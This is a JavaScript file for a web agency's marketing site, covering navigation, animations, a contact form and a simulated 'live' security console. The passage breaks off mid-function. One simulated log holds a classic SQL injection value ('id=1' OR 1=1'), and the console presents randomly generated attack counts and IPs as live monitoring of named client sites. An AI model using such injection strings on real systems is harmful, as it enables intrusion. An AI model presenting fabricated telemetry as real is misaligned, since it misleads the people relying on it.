/**
 * ARKIS AGENCY — Main JavaScript
 * Handles: Navigation, Scroll Animations, Counters, Particle Canvas, Portfolio Filters, Form
 */

'use strict';

// ═══════════════════════════════════════════════
// 1. NAVBAR — Scroll-triggered glass effect
// ═══════════════════════════════════════════════
const navbar = document.getElementById('navbar');
let lastScroll = 0;

function handleNavbar() {
  if (!navbar) return;
  const scrollY = window.scrollY;
  if (scrollY > 40) {
    navbar.classList.add('scrolled');
  } else {
    navbar.classList.remove('scrolled');
  }
  lastScroll = scrollY;
}

if (navbar) {
  window.addEventListener('scroll', handleNavbar, { passive: true });
  handleNavbar();
}

// ─── Mobile Menu ──────────────────────────────
const hamburger = document.getElementById('hamburger-btn');
const mobileMenu = document.getElementById('mobile-menu');

if (hamburger && mobileMenu) {
  hamburger.addEventListener('click', () => {
    const isOpen = mobileMenu.classList.toggle('open');
    hamburger.classList.toggle('active', isOpen);
    hamburger.setAttribute('aria-expanded', String(isOpen));
    mobileMenu.setAttribute('aria-hidden', String(!isOpen));
  });

  // Close on link click
  mobileMenu.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', () => {
      mobileMenu.classList.remove('open');
      hamburger.classList.remove('active');
      hamburger.setAttribute('aria-expanded', 'false');
      mobileMenu.setAttribute('aria-hidden', 'true');
    });
  });
}

// ═══════════════════════════════════════════════
// 2. INTERSECTION OBSERVER — Reveal animations
// ═══════════════════════════════════════════════
const revealObserver = new IntersectionObserver(
  (entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        revealObserver.unobserve(entry.target);
      }
    });
  },
  { threshold: 0.12, rootMargin: '0px 0px -40px 0px' }
);

document.querySelectorAll('.reveal-up').forEach(el => revealObserver.observe(el));

// ═══════════════════════════════════════════════
// 3. ANIMATED COUNTERS
// ═══════════════════════════════════════════════
function animateCounter(el) {
  const target = parseInt(el.dataset.target, 10);
  if (isNaN(target)) return;
  const duration = 1800;
  const start = performance.now();

  function step(timestamp) {
    const progress = Math.min((timestamp - start) / duration, 1);
    // easeOutExpo
    const eased = progress === 1 ? 1 : 1 - Math.pow(2, -10 * progress);
    el.textContent = Math.floor(eased * target);
    if (progress < 1) requestAnimationFrame(step);
    else el.textContent = target;
  }
  requestAnimationFrame(step);
}

const counterObserver = new IntersectionObserver(
  (entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        animateCounter(entry.target);
        counterObserver.unobserve(entry.target);
      }
    });
  },
  { threshold: 0.5 }
);

document.querySelectorAll('.counter').forEach(el => counterObserver.observe(el));

// ═══════════════════════════════════════════════
// 4. PARTICLE CANVAS — Animated dots network
// ═══════════════════════════════════════════════
(function initParticles() {
  const hero = document.querySelector('.hero');
  if (!hero) return;

  const canvas = document.createElement('canvas');
  canvas.setAttribute('aria-hidden', 'true');
  canvas.style.cssText = `
    position: absolute;
    inset: 0;
    pointer-events: none;
    z-index: 0;
  `;
  hero.prepend(canvas);

  const ctx = canvas.getContext('2d');
  if (!ctx) return;

  let W, H, particles, animId;
  const COUNT = window.innerWidth < 768 ? 40 : 80;
  const MAX_DIST = 140;
  const SPEED = 0.3;

  class Particle {
    constructor() { this.reset(); }
    reset() {
      this.x = Math.random() * W;
      this.y = Math.random() * H;
      this.vx = (Math.random() - 0.5) * SPEED;
      this.vy = (Math.random() - 0.5) * SPEED;
      this.r = Math.random() * 1.5 + 0.5;
      this.alpha = Math.random() * 0.5 + 0.15;
    }
    update() {
      this.x += this.vx;
      this.y += this.vy;
      if (this.x < 0 || this.x > W) this.vx *= -1;
      if (this.y < 0 || this.y > H) this.vy *= -1;
    }
    draw() {
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(0, 212, 255, ${this.alpha})`;
      ctx.fill();
    }
  }

  function resize() {
    W = canvas.width = hero.offsetWidth;
    H = canvas.height = hero.offsetHeight;
  }

  function init() {
    particles = Array.from({ length: COUNT }, () => new Particle());
  }

  function drawLines() {
    for (let i = 0; i < particles.length; i++) {
      for (let j = i + 1; j < particles.length; j++) {
        const dx = particles[i].x - particles[j].x;
        const dy = particles[i].y - particles[j].y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < MAX_DIST) {
          const alpha = (1 - dist / MAX_DIST) * 0.18;
          ctx.beginPath();
          ctx.moveTo(particles[i].x, particles[i].y);
          ctx.lineTo(particles[j].x, particles[j].y);
          ctx.strokeStyle = `rgba(0, 212, 255, ${alpha})`;
          ctx.lineWidth = 0.75;
          ctx.stroke();
        }
      }
    }
  }

  function loop() {
    ctx.clearRect(0, 0, W, H);
    particles.forEach(p => { p.update(); p.draw(); });
    drawLines();
    animId = requestAnimationFrame(loop);
  }

  // Pause when not visible (performance)
  const heroObserver = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        if (!animId) animId = requestAnimationFrame(loop);
      } else {
        if (animId) {
          cancelAnimationFrame(animId);
          animId = null;
        }
      }
    });
  });
  heroObserver.observe(hero);

  window.addEventListener('resize', () => {
    clearTimeout(window._resizeTimeout);
    window._resizeTimeout = setTimeout(() => {
      resize();
      init();
    }, 200);
  }, { passive: true });

  resize();
  init();
  animId = requestAnimationFrame(loop);
})();

// ═══════════════════════════════════════════════
// 5. SMOOTH ACTIVE NAV LINK (scroll spy)
// ═══════════════════════════════════════════════
const sections = document.querySelectorAll('section[id]');
const navLinks = document.querySelectorAll('.nav-link');

if (sections.length > 0 && navLinks.length > 0) {
  const spyObserver = new IntersectionObserver(
    (entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          const id = entry.target.getAttribute('id');
          navLinks.forEach(link => {
            const href = link.getAttribute('href');
            if (href && href.startsWith('#')) {
              const isActive = href === `#${id}`;
              link.style.color = isActive ? 'var(--clr-cyan)' : '';
            }
          });
        }
      });
    },
    { rootMargin: '-40% 0px -55% 0px' }
  );

  sections.forEach(s => spyObserver.observe(s));
}

// ═══════════════════════════════════════════════
// 6. PORTFOLIO FILTER
// ═══════════════════════════════════════════════
const filterBtns = document.querySelectorAll('.filter-btn');
const portfolioCards = document.querySelectorAll('.portfolio-card');

if (filterBtns.length > 0 && portfolioCards.length > 0) {
  filterBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      // Update button state
      filterBtns.forEach(b => {
        b.classList.remove('active');
        b.setAttribute('aria-selected', 'false');
      });
      btn.classList.add('active');
      btn.setAttribute('aria-selected', 'true');

      const filter = btn.dataset.filter;

      portfolioCards.forEach(card => {
        const cat = card.dataset.category;
        const show = filter === 'all' || cat === filter;

        if (show) {
          card.style.opacity = '1';
          card.style.transform = '';
          card.style.pointerEvents = '';
          card.hidden = false;
        } else {
          card.style.opacity = '0';
          card.style.transform = 'scale(0.95)';
          card.style.pointerEvents = 'none';
          // Delay hiding to allow transition
          setTimeout(() => {
            if (card.style.opacity === '0') card.hidden = true;
          }, 320);
        }
      });
    });
  });

  // Apply transitions to portfolio cards
  portfolioCards.forEach(card => {
    card.style.transition = 'opacity 320ms ease, transform 320ms ease';
  });
}

// ═══════════════════════════════════════════════
// 7. CONTACT FORM — Resend via /api/contact
//    Dev  : http://localhost:3000/api/contact  (server.js)
//    Prod : /api/contact  (Cloudflare Worker)
// ═══════════════════════════════════════════════
const API_ENDPOINT  = '/api/contact';
const contactForm   = document.getElementById('contact-form');
const submitBtn     = document.getElementById('contact-submit-btn');
const globalErrorEl = document.querySelector('.fs-global-error');

if (contactForm) {
  // ── Real-time browser validation UX
  contactForm.querySelectorAll('input[required], select[required], textarea[required]').forEach(field => {
    field.addEventListener('blur', () => validateField(field));
    field.addEventListener('input', () => {
      if (field.classList.contains('error')) validateField(field);
    });
  });

  function validateField(field) {
    const isValid = field.checkValidity();
    field.classList.toggle('error', !isValid);
    let nativeErr = field.parentElement.querySelector('.native-field-error');
    if (!isValid) {
      if (!nativeErr) {
        nativeErr = document.createElement('span');
        nativeErr.className = 'native-field-error fs-field-error';
        nativeErr.setAttribute('aria-live', 'polite');
        field.parentElement.appendChild(nativeErr);
      }
      if (field.validity.valueMissing)  nativeErr.textContent = 'Ce champ est requis.';
      else if (field.validity.typeMismatch) nativeErr.textContent = 'Format invalide (ex: vous@exemple.com).';
      else nativeErr.textContent = 'Valeur incorrecte.';
    } else if (nativeErr) {
      nativeErr.remove();
      field.classList.remove('error');
    }
  }

  function showGlobalError(msg) {
    if (!globalErrorEl) return;
    globalErrorEl.textContent = msg;
    globalErrorEl.classList.add('visible');
    globalErrorEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function clearGlobalError() {
    if (!globalErrorEl) return;
    globalErrorEl.textContent = '';
    globalErrorEl.classList.remove('visible');
  }

  // Clear global/field errors on manual edit
  contactForm.querySelectorAll('[data-fs-error]').forEach(errSpan => {
    const fieldName = errSpan.getAttribute('data-fs-error');
    if (!fieldName) return;
    const field = contactForm.querySelector(`[name="${fieldName}"]`);
    if (field) {
      field.addEventListener('input', () => {
        errSpan.textContent = '';
        errSpan.classList.remove('visible');
        field.classList.remove('error');
        clearGlobalError();
      });
    }
  });

  function showFieldError(fieldName, msg) {
    const errEl = contactForm.querySelector(`[data-fs-error="${fieldName}"]`);
    if (!errEl) return;
    errEl.textContent = msg;
    errEl.classList.add('visible');
    const field = contactForm.querySelector(`[name="${fieldName}"]`);
    if (field) field.classList.add('error');
  }

  function clearAllFieldErrors() {
    contactForm.querySelectorAll('[data-fs-error]').forEach(el => {
      el.textContent = '';
      el.classList.remove('visible');
    });
    contactForm.querySelectorAll('.error').forEach(el => el.classList.remove('error'));
    contactForm.querySelectorAll('.native-field-error').forEach(el => el.remove());
  }

  // ── Main submit handler → POST /api/contact
  contactForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    clearGlobalError();
    clearAllFieldErrors();

    // Honeypot
    const honey = contactForm.querySelector('[name="_honey"]');
    if (honey && honey.value.trim() !== '') return;

    // Privacy checkbox
    const privacy = document.getElementById('contact-privacy');
    if (privacy && !privacy.checked) {
      const wrap = privacy.closest('.form-privacy');
      if (wrap) { wrap.classList.add('shake'); setTimeout(() => wrap.classList.remove('shake'), 600); }
      showGlobalError("Veuillez accepter la politique de confidentialité avant d'envoyer.");
      return;
    }

    // HTML5 validation
    let isValid = true;
    contactForm.querySelectorAll('input[required], select[required], textarea[required]').forEach(field => {
      if (!field.checkValidity()) { validateField(field); isValid = false; }
    });
    if (!isValid) {
      showGlobalError('Veuillez remplir tous les champs obligatoires.');
      return;
    }

    // Loading state
    if (!submitBtn) return;
    const btnText    = submitBtn.querySelector('.btn-text');
    const btnIcon    = submitBtn.querySelector('.btn-icon');
    const origText   = btnText ? btnText.textContent : 'Envoyer';
    
    if (btnText) btnText.textContent = 'Envoi en cours…';
    if (btnIcon) btnIcon.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="animation:spin 1s linear infinite"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>`;
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.75';

    try {
      // Collect form data as JSON
      const formData = new FormData(contactForm);
      formData.delete('privacy'); // Ne pas envoyer la checkbox côté serveur
      const payload = Object.fromEntries(formData.entries());

      const response = await fetch(API_ENDPOINT, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
        body:    JSON.stringify(payload),
      });

      const data = await response.json();

      if (response.ok && data.ok) {
        // ── Succès ──
        contactForm.style.transition = 'opacity 400ms ease';
        contactForm.style.opacity    = '0';
        setTimeout(() => {
          contactForm.style.display = 'none';
          const successEl = document.getElementById('form-success');
          if (successEl) {
            successEl.removeAttribute('hidden');
            successEl.style.display = 'flex';
            successEl.focus();
          }
        }, 420);
      } else {
        // ── Erreurs Resend / validation serveur ──
        if (Array.isArray(data.errors)) {
          data.errors.forEach(err => {
            if (err.field && err.field !== 'form') {
              showFieldError(err.field, err.message);
            } else {
              showGlobalError(err.message || 'Une erreur est survenue. Veuillez réessayer.');
            }
          });
          if (!data.errors.some(e => e.field === 'form' || !e.field)) {
            showGlobalError('Certains champs contiennent des erreurs. Veuillez les corriger.');
          }
        } else {
          showGlobalError('Une erreur est survenue. Veuillez réessayer ou nous écrire directement.');
        }
        // Restaure le bouton
        if (btnText) btnText.textContent = origText;
        if (btnIcon) btnIcon.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>`;
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
      }

    } catch (networkErr) {
      console.error('[Arkis] Erreur réseau :', networkErr);
      showGlobalError('Erreur réseau — vérifiez votre connexion et réessayez.');
      if (btnText) btnText.textContent = origText;
      if (btnIcon) btnIcon.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>`;
      submitBtn.disabled = false;
      submitBtn.style.opacity = '1';
    }
  });
}

// ═══════════════════════════════════════════════
// 8. BACK TO TOP BUTTON
// ═══════════════════════════════════════════════
const backToTop = document.getElementById('back-to-top');

if (backToTop) {
  window.addEventListener('scroll', () => {
    backToTop.hidden = window.scrollY < 400;
  }, { passive: true });

  backToTop.addEventListener('click', () => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });
}

// ═══════════════════════════════════════════════
// 9. PARALLAX — Subtle hero parallax on scroll
// ═══════════════════════════════════════════════
const heroCanvas = document.querySelector('.hero-canvas');
const heroGrid = document.querySelector('.hero-grid-overlay');

if ((heroCanvas || heroGrid) && window.matchMedia('(prefers-reduced-motion: no-preference)').matches) {
  let ticking = false;
  window.addEventListener('scroll', () => {
    if (!ticking) {
      requestAnimationFrame(() => {
        const y = window.scrollY;
        if (heroCanvas) heroCanvas.style.transform = `translateY(${y * 0.15}px)`;
        if (heroGrid) heroGrid.style.transform = `translateY(${y * 0.08}px)`;
        ticking = false;
      });
      ticking = true;
    }
  }, { passive: true });
}

// ═══════════════════════════════════════════════
// 10. SERVICE CARDS — Mouse tracking glow effect
// ═══════════════════════════════════════════════
document.querySelectorAll('.service-card, .pricing-card, .portfolio-card').forEach(card => {
  card.addEventListener('mousemove', (e) => {
    const rect = card.getBoundingClientRect();
    const x = ((e.clientX - rect.left) / rect.width) * 100;
    const y = ((e.clientY - rect.top) / rect.height) * 100;
    card.style.setProperty('--mouse-x', `${x}%`);
    card.style.setProperty('--mouse-y', `${y}%`);
  });
});

// ═══════════════════════════════════════════════
// 11. SMOOTH ANCHOR SCROLL with offset & hash intercept
// ═══════════════════════════════════════════════
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
  anchor.addEventListener('click', (e) => {
    const href = anchor.getAttribute('href');
    if (href === '#') return;
    const target = document.querySelector(href);
    if (target) {
      e.preventDefault();
      const top = target.getBoundingClientRect().top + window.scrollY - 80;
      window.scrollTo({ top, behavior: 'smooth' });
    }
  });
});

// ═══════════════════════════════════════════════
// 12. TYPING EFFECT — Hero headline
// ═══════════════════════════════════════════════
(function initTypingEffect() {
  const badge = document.querySelector('.badge-text');
  if (!badge) return;
  const original = badge.textContent;
  badge.textContent = '';

  let i = 0;
  function type() {
    if (i < original.length) {
      badge.textContent += original[i++];
      setTimeout(type, 25);
    }
  }
  setTimeout(type, 800);
})();

// ═══════════════════════════════════════════════
// 13. PRICING PHASE TOGGLER (BUILD & RUN)
// ═══════════════════════════════════════════════
(function initPricingToggler() {
  const buildTab = document.getElementById('phase-build-tab');
  const runTab = document.getElementById('phase-run-tab');
  const pricingBuild = document.getElementById('pricing-build');
  const runSection = document.querySelector('.run-section');

  if (!buildTab || !runTab || !pricingBuild || !runSection) return;

  function setPhase(phase) {
    if (phase === 'run') {
      runTab.classList.add('active');
      buildTab.classList.remove('active');
      pricingBuild.style.display = 'none';
      runSection.style.display = 'block';
      runSection.style.marginTop = '0px';
    } else {
      buildTab.classList.add('active');
      runTab.classList.remove('active');
      pricingBuild.style.display = 'grid';
      runSection.style.display = 'none';
    }
  }

  buildTab.addEventListener('click', () => setPhase('build'));
  runTab.addEventListener('click', () => setPhase('run'));

  // Initial state: hide run section by default
  runSection.style.display = 'none';

  // Check URL Hash on Load
  const hash = window.location.hash;
  if (hash === '#run' || hash.startsWith('#run-')) {
    setPhase('run');
    setTimeout(() => {
      const offsetTop = runSection.getBoundingClientRect().top + window.scrollY - 80;
      window.scrollTo({ top: offsetTop, behavior: 'smooth' });
    }, 400);
  }
})();

// ═══════════════════════════════════════════════
// 14. LIVE SECURITY OBSERVABILITY (SOC ENGINE)
// ═══════════════════════════════════════════════
(function initLiveSocEngine() {
  const logContainer = document.getElementById('log-container');
  const consoleBody = document.getElementById('cyber-console');
  if (!logContainer || !consoleBody) return;

  const sites = [
    { name: 'DHM-Tech', url: 'dhmtech.com', el: document.getElementById('dhm-visits'), visits: 12840, attacks: 1284 },
    { name: 'Bricosam.fr', url: 'bricosam.fr', el: document.getElementById('bricosam-visits'), visits: 8429, attacks: 439 },
    { name: 'L\'Écrin Sucré', url: 'ecrinsucre.fr', el: document.getElementById('bakery-visits'), visits: 2840, attacks: 112 }
  ];

  // Global State
  let state = {
    activeFilter: 'ALL',
    cpuLoad: 42,
    defcon: 4,
    threatLevel: 0.02,
    latency: 82,
    attacksRate: 42,
    attacks24h: 28491,
    traffic24h: 148932,
    isDdosActive: false,
    isSqliActive: false,
    isBotActive: false,
    chartData: [85, 92, 78, 110, 95, 120, 105, 112, 98, 115, 130, 108, 118, 96, 110]
  };

  const loggedItems = [];

  // DOM Elements cache
  const attacksEl = document.getElementById('val-attacks');
  const trafficEl = document.getElementById('val-traffic');
  const latencyEl = document.getElementById('val-latency');
  const cpuEl = document.getElementById('val-cpu');
  const cpuBar = document.getElementById('bar-cpu');
  const wafModeEl = document.getElementById('waf-mode');
  const threatLevelEl = document.getElementById('threat-level-val');
  const statusDot = document.getElementById('soc-status-dot');
  const statusText = document.getElementById('soc-status-text');
  const defconShield = document.getElementById('defcon-shield');

  const btnDdos = document.getElementById('btn-sim-ddos');
  const btnSqli = document.getElementById('btn-sim-sqli');
  const btnBot = document.getElementById('btn-sim-bot');

  const logTemplates = [
    { type: 'INFO', msg: 'TLS 1.3 cryptographic handshake verified successfully.' },
    { type: 'INFO', msg: 'Integrity check pass: Edge static assets matched source SHA-256 hash.' },
    { type: 'INFO', msg: 'PostgreSQL read query executed in 1.4ms via Supabase REST Client.' },
    { type: 'INFO', msg: 'Static Page Delivery from Edge Cache Paris (POP CDG).' },
    { type: 'INFO', msg: 'Zero-Trust access token validated on administration gateway.' },
    { type: 'INFO', msg: 'Row-Level Security policy triggered: secure access isolation confirmed.' },
    { type: 'BLOCKED', msg: 'SQL Injection signature detected on search parameter ➔ Dropped by Cloudflare WAF.' },
    { type: 'BLOCKED', msg: 'Cross-Site Scripting (XSS) payload blocked on endpoint /contact.' },
    { type: 'BLOCKED', msg: 'Excessive connections from unique IP ➔ Rate-limiting threshold engaged (429).' },
    { type: 'BLOCKED', msg: 'Malicious user-agent blocked from scanning web server endpoints.' },
    { type: 'BLOCKED', msg: 'Brute-force security mitigation triggered on transaction gateway.' }
  ];

  function randomIP() {
    return `${Math.floor(Math.random() * 150) + 50}.${Math.floor(Math.random() * 200) + 10}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 254) + 1}`;
  }

  function getFormattedTime() {
    const d = new Date();
    return `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}:${String(d.getSeconds()).padStart(2, '0')}`;
  }

  // Prepopulate SOC with logs
  for (let i = 0; i < 15; i++) {
    createAndStoreLog();
  }
  renderLogs();

  function createAndStoreLog(forcedType = null, forcedMsg = null) {
    const site = sites[Math.floor(Math.random() * sites.length)];
    const template = forcedType 
      ? { type: forcedType, msg: forcedMsg }
      : logTemplates[Math.floor(Math.random() * logTemplates.length)];
    const time = getFormattedTime();

    let html = "";
    if (template.type === 'BLOCKED') {
      html = `<span style="color:#EF4444;font-weight:600;">[BLOCKED]</span> [${time}] — <strong style="color:#E8EDF8;">${site.name}</strong> — ${template.msg} <span style="color:var(--clr-text-3); font-size:0.75rem;">(Source: IP ${randomIP()})</span>`;
      state.attacks24h++;
      if (attacksEl) attacksEl.textContent = state.attacks24h.toLocaleString();
    } else {
      html = `<span style="color:#10B981;font-weight:600;">[INFO]</span> [${time}] — <strong style="color:#E8EDF8;">${site.name}</strong> — ${template.msg}`;
    }

    loggedItems.push({ type: template.type, html: html });
    if (loggedItems.length > 200) loggedItems.shift();
  }

  function renderLogs() {
    logContainer.innerHTML = "";
    loggedItems.forEach(item => {
      if (state.activeFilter === 'ALL' || item.type === state.activeFilter) {
        const p = document.createElement('p');
        p.style.marginBottom = '0.35rem';
        p.style.animation = 'fadeIn 0.2s ease-out';
        p.innerHTML = item.html;
        logContainer.appendChild(p);
      }
    });
    consoleBody.scrollTop = consoleBody.scrollHeight;
  }

  // Draw Line and Area SVG dynamic chart
  function drawChart() {
    const linePath = document.getElementById('chart-line-path');
    const areaPath = document.getElementById('chart-area-path');
    if (!linePath || !areaPath) return;

    const pointsCount = state.chartData.length;
    const stepX = 600 / (pointsCount - 1);
    
    let dLine = "";
    let dArea = "";
    
    state.chartData.forEach((val, i) => {
      const x = i * stepX;
      // Map val (0 to 1000) to Y coordinate (165 = baseline, 15 = maximum peak)
      const maxVal = state.isDdosActive ? 1000 : 250;
      const y = 165 - (val / maxVal) * 140;
      
      if (i === 0) {
        dLine += `M ${x} ${y}`;
        dArea += `M ${x} 165 L ${x} ${y}`;
      } else {
        dLine += ` L ${x} ${y}`;
        dArea += ` L ${x} ${y}`;
      }
    });
    
    dArea += ` L 600 165 Z`;
    
    linePath.setAttribute('d', dLine);
    areaPath.setAttribute('d', dArea);

    // Apply color gradient updates depending on threat activity
    const lineGrad = document.getElementById('chartGrad');
    if (state.isDdosActive) {
      linePath.setAttribute('stroke', '#EF4444');
      if (lineGrad) {
        lineGrad.querySelectorAll('stop').forEach((stop, idx) => {
          stop.setAttribute('stop-color', '#EF4444');
        });
      }
    } else {
      linePath.setAttribute('stroke', 'var(--clr-cyan)');
      if (lineGrad) {
        lineGrad.querySelectorAll('stop').forEach((stop, idx) => {
          stop.setAttribute('stop-color', '#00D4FF');
        });
      }
    }
  }

  // Threat Typology distribution circle updates
  function updateThreatDistribution(ddos = 45, sqli = 25, bot = 20, brute = 10) {
    const ddosCircle = document.getElementById('circle-ddos');
    const sqliCircle = document.getElementById('circle-sqli');
    const botCircle = document.getElementById('circle-bot');
    const bruteCircle = document.getElementById('circle-brute');
    
    if (ddosCircle) ddosCircle.setAttribute('stroke-dasharray', `${ddos} 100`);
    if (sqliCircle) {
      sqliCircle.setAttribute('stroke-dasharray', `${sqli} 100`);
      sqliCircle.setAttribute('stroke-dashoffset', `-${ddos}`);
    }
    if (botCircle) {
      botCircle.setAttribute('stroke-dasharray', `${bot} 100`);
      botCircle.setAttribute('stroke-dashoffset', `-${ddos + sqli}`);
    }
    if (bruteCircle) {
      bruteCircle.setAttribute('stroke-dasharray', `${brute} 100`);
      bruteCircle.setAttribute('stroke-dashoffset', `-${ddos + sqli + bot}`);
    }
    
    const lblDdos = document.getElementById('lbl-ddos-pct');
    const lblSqli = document.getElementById('lbl-sqli-pct');
    const lblBot = document.getElementById('lbl-bot-pct');
    
    if (lblDdos) lblDdos.textContent = `${ddos}%`;
    if (lblSqli) lblSqli.textContent = `${sqli}%`;
    if (lblBot) lblBot.textContent = `${bot}%`;
  }

  // Update hardware resource UI
  function updateSystemResources() {
    if (!cpuEl || !cpuBar) return;
    let targetCpu = 35 + Math.floor(Math.random() * 12);
    if (state.isDdosActive) {
      targetCpu = 92 + Math.floor(Math.random() * 6);
    }
    state.cpuLoad = targetCpu;
    cpuEl.textContent = `${state.cpuLoad}%`;
    cpuBar.style.width = `${state.cpuLoad}%`;
    
    if (state.cpuLoad > 85) {
      cpuEl.style.color = '#EF4444';
      cpuBar.style.backgroundColor = '#EF4444';
    } else if (state.cpuLoad > 60) {
      cpuEl.style.color = '#FBBF24';
      cpuBar.style.backgroundColor = '#FBBF24';
    } else {
      cpuEl.style.color = 'var(--clr-green)';
      cpuBar.style.backgroundColor = 'var(--clr-green)';
    }
  }

  // Hook event filters
  const filterTabs = document.querySelectorAll('#console-filter-tabs .filter-tab');
  filterTabs.forEach(tab => {
    tab.addEventListener('click', () => {
      filterTabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      state.activeFilter = tab.dataset.filter;
      renderLogs();
    });
  });

  // Simulator Buttons Event Listeners
  if (btnDdos) {
    btnDdos.addEventListener('click', () => {
      if (state.isDdosActive) return;
      state.isDdosActive = true;
      state.defcon = 1;
      window.dispatchEvent(new CustomEvent('cyber-attack-start', { detail: { type: 'ddos' } }));
      
      // Disable buttons
      btnDdos.disabled = true;
      btnDdos.style.opacity = '0.5';

      // Visual updates to critical mode
      if (statusDot) {
        statusDot.style.backgroundColor = '#EF4444';
        statusDot.style.animation = 'pulseGlow 0.4s infinite';
      }
      if (statusText) {
        statusText.textContent = 'CRITICAL SYSLOG TARGETED — DDoS FLOOD ATTACK ENGAGED — DEFCON 1';
        statusText.style.color = '#EF4444';
      }
      if (threatLevelEl) {
        threatLevelEl.textContent = 'CRITICAL RED (99.98%)';
        threatLevelEl.style.color = '#EF4444';
      }
      if (wafModeEl) {
        wafModeEl.textContent = 'ENTERPRISE FLOW SHIELD MITIGATION';
        wafModeEl.style.color = '#EF4444';
      }

      updateThreatDistribution(82, 8, 7, 3);

      // Injects rapid stream of alerts
      let alertCount = 0;
      const ddosInterval = setInterval(() => {
        const pps = 450 + Math.floor(Math.random() * 200);
        createAndStoreLog('BLOCKED', `MITIGATED DDoS Flow: Layer 7 Flood HTTP flood attack vector dropped ➔ Packets: ${pps} pps, Protocol: HTTP/2`);
        renderLogs();
        
        // Push huge values to graph
        state.chartData.shift();
        state.chartData.push(800 + Math.floor(Math.random() * 190));
        drawChart();

        alertCount++;
        if (alertCount >= 30) {
          clearInterval(ddosInterval);
          finishDdosMitigation();
        }
      }, 250);

      function finishDdosMitigation() {
        state.isDdosActive = false;
        state.defcon = 4;
        window.dispatchEvent(new CustomEvent('cyber-attack-end'));
        
        // Restore controls
        btnDdos.disabled = false;
        btnDdos.style.opacity = '1';

        if (statusDot) {
          statusDot.style.backgroundColor = 'var(--clr-green)';
          statusDot.style.animation = 'pulseGlow 1.5s infinite';
        }
        if (statusText) {
          statusText.textContent = 'SYSTEM OPERATIONAL — DEFCON 4';
          statusText.style.color = 'var(--clr-green)';
        }
        if (threatLevelEl) {
          threatLevelEl.textContent = 'NORMAL (0.02%)';
          threatLevelEl.style.color = 'var(--clr-cyan)';
        }
        if (wafModeEl) {
          wafModeEl.textContent = 'HIGH DÉFENSE';
          wafModeEl.style.color = 'var(--clr-cyan)';
        }

        updateThreatDistribution(45, 25, 20, 10);
        
        // Final syslog
        createAndStoreLog('INFO', `[MITIGATION RESULT] Cloudflare WAF successfully blocked 1.48M packets globally. Main Supabase DB load is normal.`);
        renderLogs();
      }
    });
  }

  if (btnSqli) {
    btnSqli.addEventListener('click', () => {
      if (state.isDdosActive) return;
      btnSqli.disabled = true;
      btnSqli.style.opacity = '0.5';
      window.dispatchEvent(new CustomEvent('cyber-attack-start', { detail: { type: 'sqli' } }));

      if (threatLevelEl) {
        threatLevelEl.textContent = 'HIGH SQLi ATTEMPT (14.28%)';
        threatLevelEl.style.color = '#A78BFA';
      }
      if (statusText) {
        statusText.textContent = 'PROBE INTERCEPTED — INJECTION PAYLOAD QUARANTINED — DEFCON 2';
        statusText.style.color = '#A78BFA';
      }

      // Add SQLi attack logs
      setTimeout(() => {
        createAndStoreLog('BLOCKED', `SQL Injection signature XSS/SQLI-9014 detected on query parameter: '/api/products?id=1%27%20OR%201%3D1' ➔ Connection Dropped.`);
        renderLogs();
      }, 400);

      setTimeout(() => {
        createAndStoreLog('BLOCKED', `Payload quarantine: IP ${randomIP()} blacklisted for repeated backend authentication bypass attempt.`);
        renderLogs();

        // Restore normal status
        btnSqli.disabled = false;
        btnSqli.style.opacity = '1';
        window.dispatchEvent(new CustomEvent('cyber-attack-end'));

        if (threatLevelEl) {
          threatLevelEl.textContent = 'NORMAL (0.02%)';
          threatLevelEl.style.color = 'var(--clr-cyan)';
        }
        if (statusText) {
          statusText.textContent = 'SYSTEM OPERATIONAL — DEFCON 4';
          statusText.style.color = 'var(--clr-green)';
        }
      }, 2500);
    });
  }

  if (btnBot) {
    btnBot.addEventListener('click', () => {
      if (state.isDdosActive) return;
      btnBot.disabled = true;
      btnBot.style.opacity = '0.5';
      window.dispatchEvent(new CustomEvent('cyber-attack-start', { detail: { type: 'bot' } }));

      if (threatLevelEl) {
        threatLevelEl.textContent = 'WARNING BOT SCAN ACTIVE (8.40%)';
        threatLevelEl.style.color = 'var(--clr-cyan)';
      }
      if (statusText) {
        statusText.textContent = 'BOT TELEMETRY WARNING — SCAN SEQUENCING ACTIVE — DEFCON 3';
        statusText.style.color = 'var(--clr-cyan)';
      }

      // Add crawler scanner logs
      let scanStep = 0;
      const botInterval = setInterval(() => {
        const paths = ['/api/v1/auth/session', '/api/v2/gateway/payments', '/api/v1/users/profile', '/api/v1/analytics/telemetry'];
        createAndStoreLog('BLOCKED', `REST API Fuzzing Probe blocked: GET ${paths[scanStep]} from headless python-agent.`);
        renderLogs();
        scanStep++;
        if (scanStep >= paths.length) {
          clearInterval(botInterval);
          
          btnBot.disabled = false;
          btnBot.style.opacity = '1';
          window.dispatchEvent(new CustomEvent('cyber-attack-end'));

